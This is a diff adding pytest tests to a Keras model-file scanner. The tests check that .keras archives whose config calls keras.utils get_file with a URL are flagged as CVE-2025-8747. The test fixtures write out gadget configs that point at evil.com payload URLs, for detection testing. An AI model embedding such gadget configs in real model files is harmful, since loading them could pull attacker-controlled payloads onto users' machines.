@@ -864,6 +864,103 @@ class TestCVE20251550ModuleReferences:
         assert cve_issues[0].severity == IssueSeverity.WARNING
 
 
+class TestCVE20258747GetFileGadget:
+    """Test CVE-2025-8747: keras.utils.get_file gadget bypass detection."""
+
+    def _make_keras_zip(self, config_str: str, tmp_path: Path) -> str:
+        """Helper to create a .keras ZIP with raw config string."""
+        keras_path = tmp_path / "model.keras"
+        with zipfile.ZipFile(keras_path, "w") as zf:
+            zf.writestr("config.json", config_str)
+            zf.writestr("metadata.json", json.dumps({"keras_version": "3.5.0"}))
+        return str(keras_path)
+
+    def test_get_file_with_url_detected(self, tmp_path: Path) -> None:
+        """Config referencing get_file with URL should be CRITICAL."""
+        scanner = KerasZipScanner()
+        config = {
+            "class_name": "Sequential",
+            "config": {
+                "layers": [
+                    {
+                        "class_name": "Dense",
+                        "name": "dense_1",
+                        "module": "keras.utils",
+                        "config": {
+                            "fn": "get_file",
+                            "url": "https://evil.com/payload.bin",
+                        },
+                    }
+                ]
+            },
+        }
+        result = scanner.scan(self._make_keras_zip(json.dumps(config), tmp_path))
+
+        cve_issues = [i for i in result.issues if "CVE-2025-8747" in i.message]
+        assert len(cve_issues) >= 1, "Should detect get_file + URL as CVE-2025-8747"
+        assert cve_issues[0].severity == IssueSeverity.CRITICAL
+
+    def test_get_file_without_url_no_trigger(self, tmp_path: Path) -> None:
+        """Config with get_file but no URL should NOT trigger."""
+        scanner = KerasZipScanner()
+        config = {
+            "class_name": "Sequential",
+            "config": {
+                "layers": [
+                    {
+                        "class_name": "Dense",
+                        "name": "dense_1",
+                        "config": {"fn": "get_file", "path": "/local/file.h5"},
+                    }
+                ]
+            },
+        }
+        result = scanner.scan(self._make_keras_zip(json.dumps(config), tmp_path))
+
+        cve_issues = [i for i in result.issues if "CVE-2025-8747" in i.message]
+        assert len(cve_issues) == 0, "get_file without URL should not trigger"
+
+    def test_no_false_positive_normal_config(self, tmp_path: Path) -> None:
+        """Normal config should not trigger CVE-2025-8747."""
+        scanner = KerasZipScanner()
+        config = {
+            "class_name": "Sequential",
+            "config": {"layers": [{"class_name": "Dense", "name": "dense_1", "config": {"units": 10}}]},
+        }
+        result = scanner.scan(self._make_keras_zip(json.dumps(config), tmp_path))
+
+        cve_issues = [i for i in result.issues if "CVE-2025-8747" in i.message]
+        assert len(cve_issues) == 0
+
+    def test_cve_attribution_details(self, tmp_path: Path) -> None:
+        """CVE details should be in issue details."""
+        scanner = KerasZipScanner()
+        config_str = json.dumps(
+            {
+                "class_name": "Sequential",
+                "config": {
+                    "layers": [
+                        {
+                            "class_name": "Dense",
+                            "name": "d",
+                            "config": {
+                                "fn": "get_file",
+                                "url": "http://evil.com/x",
+                            },
+                        }
+                    ]
+                },
+            }
+        )
+        result = scanner.scan(self._make_keras_zip(config_str, tmp_path))
+
+        cve_issues = [i for i in result.issues if "CVE-2025-8747" in i.message]
+        assert len(cve_issues) >= 1
+        details = cve_issues[0].details
+        assert details["cve_id"] == "CVE-2025-8747"
+        assert details["cwe"] == "CWE-502"
+
+
 class TestKerasZipScannerSubclassed:
     """Tests for subclassed model detection in ZIP format."""
 
